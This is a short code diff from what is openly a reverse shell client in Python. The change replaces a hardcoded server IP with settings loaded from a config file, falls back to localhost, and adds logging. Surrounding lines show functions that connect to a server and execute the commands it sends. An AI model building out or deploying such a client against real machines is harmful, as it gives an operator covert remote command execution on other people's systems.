@@ -121,13 +121,23 @@ def execute_commands(s):
             pass
 
 def main():
-    # Configuration
-    host = "172.25.217.136"  # Change this to your server IP
-    port = 9999
+    # Try to load configuration
+    config = load_config()
+    
+    if config and "client" in config:
+        # Use values from config file
+        host = config["client"].get("server_ip", "127.0.0.1")
+        port = config["client"].get("server_port", 9999)
+    else:
+        # Fallback to default values
+        host = "127.0.0.1"
+        port = 9999
+        log_message("Using default configuration", "WARNING")
     
     log_message("=" * 50)
     log_message("Reverse Shell Client Starting...")
     log_message("=" * 50)
+    log_message(f"Attempting to connect to {host}:{port}")
     
     # Connect to server
     s = connect_to_server(host, port)
